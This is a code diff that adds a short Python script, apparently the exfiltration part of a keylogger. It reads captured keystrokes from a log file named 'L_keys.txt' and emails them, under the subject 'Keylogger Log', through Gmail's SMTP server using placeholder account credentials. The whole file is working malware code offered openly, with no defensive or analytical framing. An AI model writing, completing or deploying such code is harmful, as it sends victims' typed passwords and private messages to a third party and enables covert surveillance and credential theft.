@@ -1,0 +1,30 @@
+import smtplib
+from email.message import EmailMessage
+
+def send_email():
+    sender_email = "Email"
+    receiver_email = "Email"
+    password = "App Password"
+
+    # Read log file
+    with open("L_keys.txt", "r") as file:
+        log_content = file.read()
+
+    # Create email message
+    msg = EmailMessage()
+    msg.set_content(log_content)
+    msg['Subject'] = "Keylogger Log"
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+
+    try:
+        # Send email
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+            smtp.login(sender_email, password)
+            smtp.send_message(msg)
+        print("Email sent successfully")
+    except Exception as e:
+        print(f"Email failed: {e}")
+
+# Call the function
+send_email()
